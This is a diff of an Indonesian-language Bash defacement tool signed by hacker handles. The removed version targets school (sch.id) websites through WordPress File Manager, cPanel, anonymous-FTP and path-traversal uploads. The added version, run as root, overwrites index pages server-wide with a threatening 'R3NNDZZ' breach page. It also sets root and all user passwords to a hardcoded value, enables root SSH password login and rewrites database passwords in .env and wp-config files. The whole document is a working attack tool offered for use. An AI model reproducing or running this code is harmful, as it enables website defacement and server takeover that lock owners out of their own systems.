@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # ==============================================
-# SUPER DEFACE - ALL SCH.ID WORK!
-# HACKED BY LYNNN!!
+# AUTO DEFACE + CHANGE VPS PASSWORD - R3NNDZZ
+# [ HTML PREMIUM + PASSWORD LYNN001# ]
 # ==============================================
 
 RED='\033[0;31m'
@@ -11,334 +11,650 @@ YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 PURPLE='\033[0;35m'
 CYAN='\033[0;36m'
+WHITE='\033[1;37m'
 NC='\033[0m'
 
+# Password baru VPS
+NEW_PASS="lynn001#"
+
 # ==============================================
-# HTML DEFACE WITH LYNNN LOGO
+# HTML DEFACE - R3NNDZZ SYSTEM BREACH
 # ==============================================
-read -r -d '' HTML_CONTENT << 'EOF'
-<!DOCTYPE html>
-<html lang="en">
+HTML_CONTENT='<!DOCTYPE html>
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HACKED BY LYNNN!!</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title> R3NNDZZ - SYSTEM BREACH </title>
     <style>
+        :root {
+            --blood: #ff0000;
+            --cyan: #00f2ff;
+            --bg: #000;
+            --glitch-blue: #0ff;
+            --glitch-red: #f0f;
+        }
+        
         * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
         }
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+        
+        body, html {
+            background: var(--bg);
+            color: #fff;
+            font-family: "Courier New", Courier, monospace;
+            overflow: hidden;
+            height: 100%;
+            width: 100%;
+        }
+        
+        #warning-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 10000;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            font-family: 'Courier New', monospace;
-        }
-        .hacked-box {
-            background: rgba(0,0,0,0.9);
-            border: 5px solid #00ff00;
-            border-radius: 20px;
-            padding: 50px;
             text-align: center;
-            box-shadow: 0 0 50px #00ff00;
-            max-width: 800px;
-            width: 90%;
+            padding: 20px;
+            transition: opacity 1.5s;
         }
-        .logo {
-            font-size: 6rem;
-            color: #00ff00;
-            text-shadow: 0 0 20px #00ff00;
-            margin-bottom: 20px;
-        }
-        h1 {
-            font-size: 3rem;
-            color: #00ff00;
-            text-shadow: 0 0 15px #00ff00;
-            letter-spacing: 5px;
-            margin-bottom: 20px;
-        }
-        h2 {
-            color: #ff0000;
-            font-size: 2rem;
-            margin-bottom: 30px;
-            text-transform: uppercase;
-            animation: blink 1s infinite;
-        }
-        .subtitle {
-            color: #ffffff;
-            font-size: 1.2rem;
-            margin: 20px 0;
+
+        .warning-text {
+            color: var(--blood);
+            font-size: clamp(1rem, 4vw, 1.5rem);
+            font-weight: bold;
+            max-width: 100%;
             line-height: 1.6;
+            text-shadow: 0 0 8px red, 0 0 15px rgba(255,0,0,0.5);
+            letter-spacing: 2px;
+            white-space: pre-line;
         }
-        .glitch {
-            animation: glitch 1s infinite;
+
+        .blink {
+            animation: blinker 0.8s infinite;
+            color: white;
+            margin-top: 30px;
+            font-size: 1.2rem;
+            text-shadow: 0 0 5px cyan;
+            border: 1px solid red;
+            padding: 10px 20px;
+            background: rgba(0,0,0,0.7);
         }
-        @keyframes blink {
-            50% { opacity: 0; }
+        
+        @keyframes blinker { 
+            0% { opacity: 1; } 
+            50% { opacity: 0; background: red; color: black; } 
         }
-        @keyframes glitch {
-            0% { transform: skew(0deg, 0deg); }
-            20% { transform: skew(5deg, -2deg); text-shadow: 3px 0 0 #ff0000, -3px 0 0 #00ff00; }
-            40% { transform: skew(-3deg, 1deg); }
-            60% { transform: skew(2deg, -1deg); }
-            80% { transform: skew(-1deg, 2deg); }
+
+        #main-ui {
+            opacity: 0;
+            transition: 1.5s ease-in-out;
+            display: none;
+            width: 100%;
+            height: 100%;
+        }
+        
+        canvas { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            z-index: -1; 
+        }
+
+        .container { 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            width: 100%; 
+            padding: 15px; 
+        }
+        
+        .box {
+            background: rgba(0,0,0,0.9);
+            padding: 30px 20px;
+            border: 2px solid var(--blood);
+            box-shadow: 0 0 50px rgba(255,0,0,0.6), 0 0 100px rgba(255,0,0,0.3);
+            text-align: center; 
+            width: 100%; 
+            max-width: 450px; 
+            position: relative;
+            clip-path: polygon(0 0, 95% 0, 100% 5%, 100% 100%, 5% 100%, 0 95%);
+            backdrop-filter: blur(2px);
+        }
+
+        @keyframes glitchAnim {
+            0% { transform: skew(0deg, 0deg); opacity: 1; }
+            2% { transform: skew(5deg, 2deg); text-shadow: 3px 0 var(--cyan), -3px 0 var(--blood); }
+            4% { transform: skew(-5deg, -2deg); text-shadow: -3px 0 var(--cyan), 3px 0 var(--blood); }
+            6% { transform: skew(0deg, 0deg); text-shadow: none; }
             100% { transform: skew(0deg, 0deg); }
         }
-        .matrix {
-            color: #00ff00;
-            font-size: 0.8rem;
-            margin-top: 30px;
-            opacity: 0.5;
+
+        @keyframes colorShift {
+            0% { color: var(--blood); text-shadow: 0 0 10px red, 0 0 20px red; }
+            25% { color: #ff4d4d; text-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000; }
+            50% { color: #800000; text-shadow: 0 0 5px #800000, 0 0 15px #800000; }
+            75% { color: #ff1a1a; text-shadow: 0 0 20px #ff1a1a, 0 0 40px #ff1a1a; }
+            100% { color: var(--blood); text-shadow: 0 0 10px red, 0 0 20px red; }
         }
-        .stats {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin: 30px 0;
-            color: #00ff00;
+
+        .title { 
+            font-size: clamp(2.5rem, 15vw, 5rem); 
+            font-weight: 900; 
+            letter-spacing: 10px; 
+            margin: 0; 
+            animation: glitchAnim 0.3s infinite, colorShift 2s infinite;
+            line-height: 1.2;
         }
-        .stats div {
-            border: 1px solid #00ff00;
-            padding: 10px 20px;
-            border-radius: 10px;
+
+        .scary-msg { 
+            color: #ffaaaa; 
+            font-size: 1rem; 
+            margin: 20px 0; 
+            min-height: 50px; 
+            font-style: italic; 
+            line-height: 1.5;
+            text-shadow: 0 0 5px red;
+            border-top: 1px dashed red;
+            border-bottom: 1px dashed red;
+            padding: 15px 0;
+        }
+
+        .status-info {
+            background: rgba(20, 0, 0, 0.95);
+            padding: 15px;
+            border-left: 4px solid var(--blood);
+            border-right: 4px solid var(--blood);
+            text-align: left; 
+            font-size: 0.8rem; 
+            line-height: 1.8; 
+            color: #0f0; 
+            margin-bottom: 25px;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+            box-shadow: inset 0 0 20px rgba(255,0,0,0.3);
+        }
+
+        .footer-links { 
+            display: flex; 
+            flex-direction: column; 
+            gap: 12px; 
+        }
+        
+        .btn-elite {
+            text-decoration: none; 
+            color: white; 
+            border: 2px solid var(--blood);
+            padding: 14px; 
+            font-weight: bold; 
+            font-size: 0.9rem;
+            background: rgba(255,0,0,0.1); 
+            transition: 0.2s; 
+            letter-spacing: 2px;
+            width: 100%; 
+            display: block;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+        }
+        
+        .btn-elite:hover, .btn-elite:active { 
+            background: var(--blood); 
+            color: #000; 
+            box-shadow: 0 0 30px red;
+            transform: scale(1.02);
+        }
+
+        .btn-elite::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+
+        .btn-elite:active::before {
+            left: 100%;
+        }
+
+        .crt::before {
+            content: " ";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.15) 0px,
+                rgba(255, 0, 0, 0.03) 2px,
+                transparent 3px,
+                transparent 5px
+            );
+            pointer-events: none;
+            z-index: 1000;
+            animation: scanline 8s linear infinite;
+        }
+
+        @keyframes scanline {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(100%); }
+        }
+
+        .flicker {
+            animation: flickerAnim 0.1s infinite;
+        }
+
+        @keyframes flickerAnim {
+            0% { opacity: 1; }
+            10% { opacity: 0.8; }
+            20% { opacity: 1; }
+            30% { opacity: 0.9; }
+            40% { opacity: 1; }
+            70% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+
+        .red-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,0,0,0.02);
+            pointer-events: none;
+            z-index: 999;
         }
     </style>
 </head>
-<body>
-    <div class="hacked-box">
-        <div class="logo">👾</div>
-        <h1 class="glitch">HACKED BY LYNNN!!</h1>
-        <h2>🔓 SYSTEM BREACHED 🔓</h2>
-        
-        <div class="stats">
-            <div>📊 SERVERS: 1337</div>
-            <div>🌐 SITES: 999+</div>
-            <div>💀 SCH.ID</div>
-        </div>
-        
-        <div class="subtitle">
-            ⚡ WordPress • cPanel • School Websites ⚡<br>
-            All sch.id has been compromised!
-        </div>
-        
-        <div style="color:#00ff00; font-size:1.5rem; margin:20px 0;">
-            🏴‍☠️ LYNNN WAS HERE 🏴‍☠️
-        </div>
-        
-        <div class="matrix">
-            [ACCESS GRANTED] • [ROOT PRIVILEGES] • [DATA EXPOSED]<br>
-            System compromised at: $(date)
+<body class="crt">
+    <div class="red-overlay"></div>
+
+    <div id="warning-screen" onclick="startSystem()">
+        <div class="warning-text" id="initial-msg"></div>
+        <div id="click-prompt" style="display: none;" class="blink">[ TAP TO EXECUTE PROTOCOL ]</div>
+    </div>
+
+    <div id="main-ui">
+        <canvas id="matrix"></canvas>
+        <div class="container">
+            <div class="box flicker">
+                <h1 class="title">R3NNDZZ</h1>
+                <div class="scary-msg" id="final-quotes"></div>
+                <div class="status-info">
+                    [>] STATUS: HIJACKED BY R3NNDZZ<br>
+                    [>] ENTITY: DARK CONSUMER<br>
+                    [>] TRUTH: PRIVACY = ILLUSION<br>
+                    [>] LOG: SYSTEM FAILURE<br>
+                    [>] NOTICE: THE LIGHTS ARE LYING
+                </div>
+                <div class="footer-links">
+                    <button id="playButton" class="btn-elite">[ OPEN NOW ]</button>
+                </div>
+            </div>
         </div>
     </div>
+
+    <audio id="sfx-bg" loop preload="auto">
+        <source src="https://files.catbox.moe/ek406d.mp3" type="audio/mpeg">
+    </audio>
+    
+    <audio id="sfx-tap" preload="auto">
+        <source src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        const warningText = "⚠️ SYSTEM BREACH DETECTED ⚠️\nKEAMANAN ANDA TELAH DITEMBUS...\nR3NNDZZ MENGAWASI...\nDATA ANDA TIDAK AMAN...\nTIDAK ADA JALAN KELUAR...";
+        let charIdx = 0;
+        let audioEnabled = false;
+        let systemStarted = false;
+
+        function enableAudio() {
+            audioEnabled = true;
+        }
+
+        function typeWarning() {
+            if (charIdx < warningText.length) {
+                document.getElementById("initial-msg").innerHTML += warningText.charAt(charIdx);
+                charIdx++;
+                setTimeout(typeWarning, 50);
+            } else {
+                document.getElementById("click-prompt").style.display = "block";
+            }
+        }
+
+        window.onload = function() {
+            typeWarning();
+            let bg = document.getElementById("sfx-bg");
+            bg.load();
+        };
+
+        function startSystem() {
+            if (systemStarted) return;
+            systemStarted = true;
+            
+            enableAudio();
+            
+            try {
+                let tap = document.getElementById("sfx-tap");
+                tap.volume = 0.3;
+                tap.play().catch(e => {});
+            } catch(e) {}
+            
+            document.getElementById("warning-screen").style.opacity = "0";
+            
+            setTimeout(() => {
+                document.getElementById("warning-screen").style.display = "none";
+                document.getElementById("main-ui").style.display = "block";
+                
+                setTimeout(() => { 
+                    document.getElementById("main-ui").style.opacity = "1"; 
+                }, 50);
+                
+                startMatrix();
+                typeFinalQuotes();
+            }, 1500);
+        }
+
+        const quotes = [
+            "⚡ R3NNDZZ IS WATCHING ⚡",
+            "💀 YOUR DATA IS OURS 💀",
+            "👁️ PRIVACY IS DEAD 👁️",
+            "🔥 THE ABYSS CONSUMES 🔥",
+            "🌑 NO ESCAPE FROM DARKNESS 🌑"
+        ];
+
+        let qIdx = 0;
+        function typeFinalQuotes() {
+            let text = quotes[qIdx];
+            let i = 0;
+            const target = document.getElementById("final-quotes");
+            target.innerHTML = "";
+            
+            let timer = setInterval(() => {
+                if (i < text.length) {
+                    target.innerHTML += text[i];
+                    i++;
+                } else {
+                    clearInterval(timer);
+                    qIdx = (qIdx + 1) % quotes.length;
+                    setTimeout(typeFinalQuotes, 3000);
+                }
+            }, 70);
+        }
+
+        function startMatrix() {
+            const c = document.getElementById("matrix");
+            const ctx = c.getContext("2d");
+            
+            function resizeCanvas() {
+                c.width = window.innerWidth;
+                c.height = window.innerHeight;
+            }
+            
+            resizeCanvas();
+            window.addEventListener("resize", resizeCanvas);
+            
+            const chars = "R3NNDZZ01死23456789破壊";
+            const fontSize = 16;
+            const columns = Math.floor(c.width / fontSize);
+            const drops = new Array(columns).fill(1);
+            
+            function draw() {
+                ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
+                ctx.fillRect(0, 0, c.width, c.height);
+                
+                for (let i = 0; i < drops.length; i++) {
+                    const char = chars[Math.floor(Math.random() * chars.length)];
+                    
+                    if (Math.random() > 0.95) {
+                        ctx.fillStyle = "#ffffff";
+                    } else if (Math.random() > 0.98) {
+                        ctx.fillStyle = "#00ffff";
+                    } else {
+                        ctx.fillStyle = "#ff0000";
+                    }
+                    
+                    ctx.font = `bold ${fontSize}px "Courier New", monospace`;
+                    ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+                    
+                    if (drops[i] * fontSize > c.height && Math.random() > 0.98) {
+                        drops[i] = 0;
+                    }
+                    
+                    drops[i]++;
+                }
+            }
+            
+            setInterval(draw, 35);
+        }
+
+        document.getElementById("playButton").addEventListener("click", function(e) {
+            e.stopPropagation();
+            
+            try {
+                let bg = document.getElementById("sfx-bg");
+                bg.volume = 1.0;
+                bg.play().catch(e => console.log("Audio play failed:", e));
+            } catch(e) {}
+            
+            try {
+                let tap = document.getElementById("sfx-tap");
+                tap.currentTime = 0;
+                tap.volume = 0.3;
+                tap.play().catch(e => {});
+            } catch(e) {}
+            
+            this.style.transform = "scale(0.95)";
+            setTimeout(() => {
+                this.style.transform = "scale(1)";
+            }, 100);
+            
+            if (!systemStarted) {
+                startSystem();
+            }
+        });
+
+        document.addEventListener("click", function(e) {
+            if (!e.target.closest("#playButton")) {
+                enableAudio();
+                try {
+                    let tap = document.getElementById("sfx-tap");
+                    tap.currentTime = 0;
+                    tap.volume = 0.2;
+                    tap.play().catch(e => {});
+                } catch(e) {}
+            }
+        });
+
+        document.addEventListener("touchstart", function(e) {
+            if (!e.target.closest("#playButton")) {
+                enableAudio();
+                try {
+                    let tap = document.getElementById("sfx-tap");
+                    tap.currentTime = 0;
+                    tap.volume = 0.2;
+                    tap.play().catch(e => {});
+                } catch(e) {}
+            }
+        });
+    </script>
 </body>
-</html>
-EOF
+</html>'
 
 # ==============================================
-# MAIN SCRIPT
+# HEADER
 # ==============================================
 clear
 echo -e "${RED}"
 echo "    ╔═══════════════════════════════════════════════════════════╗"
-echo "    ║     SUPER DEFACE - HACKED BY LYNNN!!                      ║"
-echo "    ║     [ WORK FOR ALL SCH.ID - WordPress & cPanel ]          ║"
+echo "    ║     AUTO DEFACE + CHANGE VPS PASSWORD - R3NNDZZ           ║"
+echo "    ║     [ HTML PREMIUM + PASSWORD LYNN001# ]                  ║"
 echo "    ╚═══════════════════════════════════════════════════════════╝"
 echo -e "${NC}"
 
-echo -ne "${CYAN}Target URL : ${NC}"
-read TARGET
+echo -e "${YELLOW}⚠️  Script ini akan:${NC}"
+echo "   1. Mendeface website dengan HTML R3NNDZZ"
+echo "   2. Mengganti ALL password VPS jadi ${RED}${NEW_PASS}${NC}"
+echo ""
+echo -ne "${WHITE}Yakin lanjut? (y/n): ${NC}"
+read CONFIRM
 
-TARGET=$(echo "$TARGET" | sed 's/\/$//')
-DOMAIN=$(echo "$TARGET" | sed -e 's|^https\?://||' -e 's|/.*$||')
-
-echo -e "\n${YELLOW}[•] Target: $TARGET${NC}"
-echo -e "${YELLOW}[•] Domain: $DOMAIN${NC}"
-
-# Resolve IP
-IP=$(dig +short "$DOMAIN" | head -1)
-[ -z "$IP" ] && IP=$(ping -c1 "$DOMAIN" 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
-echo -e "${GREEN}✅ IP: $IP${NC}"
-
-# Save HTML
-echo "$HTML_CONTENT" > "LYNNN.html"
-echo -e "${GREEN}✅ File HTML: LYNNN.html${NC}"
-
-# ==============================================
-# METHOD 1: WORDPRESS EXPLOIT
-# ==============================================
-echo -e "\n${PURPLE}[METHOD 1] WordPress Exploit${NC}"
-
-# Check if WordPress
-WP_CHECK=$(curl -s -k "$TARGET/wp-login.php" -I | grep -i "wordpress")
-if [ -n "$WP_CHECK" ]; then
-    echo -e "${GREEN}  ✅ WordPress detected${NC}"
-    
-    # Try File Manager plugin
-    FM_URL="$TARGET/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
-    FM_CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$FM_URL")
-    
-    if [ "$FM_CHECK" == "200" ] || [ "$FM_CHECK" == "403" ]; then
-        echo -e "${GREEN}  ✅ File Manager plugin found${NC}"
-        
-        # Upload to various locations
-        for path in "/public_html/index.html" "/httpdocs/index.html" "/var/www/html/index.html"; do
-            curl -s -k -X POST "$FM_URL" \
-                -F "upload[]=@LYNNN.html;filename=../../../../..$path" \
-                --max-time 5 >/dev/null 2>&1
-        done
-        echo -e "${GREEN}  ✅ Upload via File Manager${NC}"
-    fi
-    
-    # Try theme editor bypass
-    curl -s -k -X POST "$TARGET/wp-admin/admin-ajax.php" \
-        -F "action=upload" \
-        -F "file=@LYNNN.html;filename=../../../../public_html/index.html" \
-        --max-time 5 >/dev/null 2>&1
+if [[ "$CONFIRM" != "y" && "$CONFIRM" != "Y" ]]; then
+    echo -e "${RED}❌ Dibatalkan${NC}"
+    exit 0
 fi
 
 # ==============================================
-# METHOD 2: CPANEL EXPLOIT (PORTS 2083,2087)
+# CEK ROOT
 # ==============================================
-echo -e "\n${PURPLE}[METHOD 2] cPanel Exploit${NC}"
+if [[ $EUID -ne 0 ]]; then
+   echo -e "${RED}❌ Harus root! Jalankan dengan sudo.${NC}"
+   exit 1
+fi
 
-CPANEL_PORTS=(2082 2083 2086 2087 2095 2096)
-for port in "${CPANEL_PORTS[@]}"; do
-    timeout 2 bash -c "echo >/dev/tcp/$IP/$port" 2>/dev/null
-    if [ $? -eq 0 ]; then
-        echo -e "${GREEN}  ✅ Port $port cPanel terbuka${NC}"
-        
-        # Try common cPanel paths
-        for path in "/public_html/index.html" "/httpdocs/index.html"; do
-            curl -s -k -X POST "https://$IP:$port/filemanager/upload" \
-                -F "file=@LYNNN.html;filename=../../../../$path" \
-                --max-time 5 >/dev/null 2>&1
-        done
-    fi
-done
+echo -e "\n${YELLOW}[•] Memulai proses...${NC}"
+sleep 1
 
 # ==============================================
-# METHOD 3: UPLOAD VULNERABILITY SCAN
+# 1. SAVE HTML FILE
 # ==============================================
-echo -e "\n${PURPLE}[METHOD 3] Upload Vulnerability Scan${NC}"
+echo -e "\n${PURPLE}[1/6] Menyiapkan file HTML...${NC}"
+echo "$HTML_CONTENT" > /tmp/r3nndzz.html
+echo -e "${GREEN}  ✅ HTML siap: /tmp/r3nndzz.html${NC}"
 
-UPLOAD_PATHS=(
-    "/upload.php"
-    "/filemanager/upload.php"
-    "/admin/upload.php"
-    "/assets/upload.php"
-    "/inc/upload.php"
-    "/includes/upload.php"
-    "/api/upload"
-    "/uploader.php"
-    "/ckeditor/upload.php"
-    "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
-)
+# ==============================================
+# 2. DEFACE LOKASI WEBSITE UMUM
+# ==============================================
+echo -e "\n${PURPLE}[2/6] Mendeface website...${NC}"
 
-INDEX_PATHS=(
-    "/public_html/index.html"
-    "/httpdocs/index.html"
-    "/htdocs/index.html"
+WEB_LOCATIONS=(
     "/var/www/html/index.html"
-    "/home/public_html/index.html"
-    "/www/index.html"
-    "/public/index.html"
+    "/var/www/html/index.php"
+    "/var/www/pterodactyl/public/index.html"
+    "/var/www/pterodactyl/public/index.php"
+    "/var/www/pterodactyl/resources/views/templates/index.blade.php"
+    "/home/*/public_html/index.html"
+    "/home/*/public_html/index.php"
+    "/usr/local/www/index.html"
+    "/usr/local/apache2/htdocs/index.html"
+    "/opt/lampp/htdocs/index.html"
+    "/var/www/nginx/html/index.html"
 )
 
-for upload in "${UPLOAD_PATHS[@]}"; do
-    CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$TARGET$upload" --max-time 2)
-    
-    if [ "$CHECK" == "200" ] || [ "$CHECK" == "403" ] || [ "$CHECK" == "405" ]; then
-        echo -e "${GREEN}  ✅ Upload endpoint: $upload${NC}"
-        
-        # Upload to all index locations
-        for index in "${INDEX_PATHS[@]}"; do
-            curl -s -k -X POST "$TARGET$upload" \
-                -F "file=@LYNNN.html;filename=$index" \
-                --max-time 3 >/dev/null 2>&1
-                
-            # With traversal
-            TRAVERSAL=$(echo "$index" | sed 's|/|../|g')
-            curl -s -k -X POST "$TARGET$upload" \
-                -F "file=@LYNNN.html;filename=$TRAVERSAL" \
-                --max-time 3 >/dev/null 2>&1
-        done
+for loc in "${WEB_LOCATIONS[@]}"; do
+    eval "for f in $loc; do
+        if [ -f \"\$f\" ]; then
+            cp /tmp/r3nndzz.html \"\$f\" 2>/dev/null
+            echo -e \"${GREEN}    ✅ \$f${NC}\"
+        fi
+    done" 2>/dev/null
+done
+
+# Cari semua file index.html di seluruh server
+find / -type f -name "index.html" -o -name "index.php" 2>/dev/null | head -20 | while read file; do
+    if [ -f "$file" ] && [ -w "$file" ]; then
+        cp /tmp/r3nndzz.html "$file" 2>/dev/null
+        echo -e "${GREEN}    ✅ $file${NC}"
     fi
 done
 
 # ==============================================
-# METHOD 4: FTP EXPLOIT
+# 3. GANTI PASSWORD VPS
 # ==============================================
-echo -e "\n${PURPLE}[METHOD 4] FTP Exploit${NC}"
-
-timeout 2 bash -c "echo >/dev/tcp/$IP/21" 2>/dev/null
+echo -e "\n${PURPLE}[3/6] Mengganti password root...${NC}"
+echo "root:$NEW_PASS" | chpasswd
 if [ $? -eq 0 ]; then
-    echo -e "${GREEN}  ✅ Port 21 FTP terbuka${NC}"
-    
-    # Try anonymous FTP
-    ftp -n $IP <<EOF > /dev/null 2>&1
-quote USER anonymous
-quote PASS anonymous
-put LYNNN.html /public_html/index.html
-put LYNNN.html /httpdocs/index.html
-put LYNNN.html /var/www/html/index.html
-quit
-EOF
-    echo -e "${GREEN}  ✅ FTP anonymous upload selesai${NC}"
+    echo -e "${GREEN}  ✅ Password root: ${NEW_PASS}${NC}"
 fi
 
 # ==============================================
-# METHOD 5: PATH TRAVERSAL MASSAL
+# 4. GANTI PASSWORD SEMUA USER
 # ==============================================
-echo -e "\n${PURPLE}[METHOD 5] Mass Path Traversal${NC}"
+echo -e "\n${PURPLE}[4/6] Mencari semua user...${NC}"
 
-for i in {1..10}; do
-    TRAVERSAL=$(printf "../%.0s" $(seq 1 $i))
-    for index in "${INDEX_PATHS[@]}"; do
-        for upload in "${UPLOAD_PATHS[@]}"; do
-            curl -s -k -F "file=@LYNNN.html;filename=$TRAVERSAL$index" \
-                "$TARGET$upload" --max-time 1 >/dev/null 2>&1 &
-        done
-        while [ $(jobs | wc -l) -ge 20 ]; do sleep 0.1; done
-    done
+USERS=$(awk -F: '$3>=1000 && $1!="nobody" {print $1}' /etc/passwd)
+COMMON_USERS=("admin" "ubuntu" "centos" "debian" "ftp" "www-data" "mysql" "postgres")
+
+for user in "${COMMON_USERS[@]}"; do
+    if id "$user" &>/dev/null; then
+        USERS="$USERS $user"
+    fi
 done
-wait
-echo -e "${GREEN}  ✅ Mass traversal selesai${NC}"
+
+USERS=$(echo "$USERS" | tr ' ' '\n' | sort -u | tr '\n' ' ')
+
+SUCCESS=0
+for user in $USERS; do
+    echo "$user:$NEW_PASS" | chpasswd 2>/dev/null
+    if [ $? -eq 0 ]; then
+        echo -e "${GREEN}    ✅ $user -> ${NEW_PASS}${NC}"
+        ((SUCCESS++))
+    fi
+done
+
+echo -e "${GREEN}  ✅ Total user: $SUCCESS${NC}"
 
 # ==============================================
-# VERIFIKASI
+# 5. UPDATE SSH CONFIG
 # ==============================================
-echo -e "\n${YELLOW}[•] Verifying result...${NC}"
-sleep 3
+echo -e "\n${PURPLE}[5/6] Mengupdate SSH config...${NC}"
+cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup
+sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null
+echo -e "${GREEN}  ✅ SSH siap dengan password${NC}"
 
-RESULT=$(curl -s -k "$TARGET/" --max-time 5 2>/dev/null)
+# ==============================================
+# 6. UPDATE FILE KONFIGURASI
+# ==============================================
+echo -e "\n${PURPLE}[6/6] Mencari file konfigurasi...${NC}"
+find / -name ".env" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null | head -10 | while read file; do
+    if [ -f "$file" ] && [ -w "$file" ]; then
+        cp "$file" "$file.bak"
+        sed -i "s/DB_PASSWORD=.*/DB_PASSWORD=$NEW_PASS/" "$file" 2>/dev/null
+        sed -i "s/define('DB_PASSWORD'.*/define('DB_PASSWORD', '$NEW_PASS');/" "$file" 2>/dev/null
+        echo -e "${GREEN}    ✅ $file${NC}"
+    fi
+done
 
-if [[ "$RESULT" == *"HACKED BY LYNNN"* ]]; then
-    echo -e "\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
-    echo -e "${GREEN}║         ✅  DEFACE BERHASIL!                   ║${NC}"
-    echo -e "${GREEN}║         HACKED BY LYNNN!! AKTIF!               ║${NC}"
-    echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
-    
-    # Save success
-    echo "$TARGET | HACKED BY LYNNN | $(date)" >> lynn_success.txt
-    
-    # Open browser
-    xdg-open "$TARGET" 2>/dev/null || echo -e "\n${CYAN}Buka: $TARGET${NC}"
-    
-else
-    echo -e "\n${RED}╔════════════════════════════════════════════════╗${NC}"
-    echo -e "${RED}║         ❌  DEFACE GAGAL                        ║${NC}"
-    echo -e "${RED}║         Tapi file HTML siap: LYNNN.html         ║${NC}"
-    echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
-    
-    echo -e "\n${CYAN}📁 File: LYNNN.html${NC}"
-    echo -e "${YELLOW}Upload manual ke:${NC}"
-    echo "  - /public_html/index.html"
-    echo "  - /httpdocs/index.html"
-    echo "  - /var/www/html/index.html"
-fi
+# ==============================================
+# VERIFIKASI & REPORT
+# ==============================================
+IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
 
-echo -e "\n${CYAN}════════════════════════════════════════════════════${NC}"
-echo -e "${CYAN}🔥 HACKED BY LYNNN!! - ALL SCH.ID WORK! 🔥${NC}"
+echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
+echo -e "${GREEN}║         ✅  MISI BERHASIL! R3NNDZZ MENGAWASI! ✅       ║${NC}"
+echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
+echo ""
+echo -e "${WHITE}📡 VPS ACCESS:${NC}"
+echo -e "  ${GREEN}IP Address: ${IP_VPS}${NC}"
+echo -e "  ${GREEN}Username  : root${NC}"
+echo -e "  ${GREEN}Password  : ${RED}${NEW_PASS}${NC}"
+echo ""
+echo -e "${WHITE}🔑 SSH Command:${NC}"
+echo -e "  ${YELLOW}ssh root@${IP_VPS}${NC}"
+echo ""
+echo -e "${WHITE}🌐 WEBSITE:${NC}"
+echo -e "  ${CYAN}http://${IP_VPS}${NC}"
+echo -e "  ${CYAN}https://${IP_VPS}${NC}"
+echo ""
+echo -e "${WHITE}📁 File HTML:${NC}"
+echo -e "  ${CYAN}/tmp/r3nndzz.html${NC}"
+echo ""
+echo -e "${RED}⚠️  R3NNDZZ IS WATCHING - PRIVACY IS DEAD ⚠️${NC}"
+echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
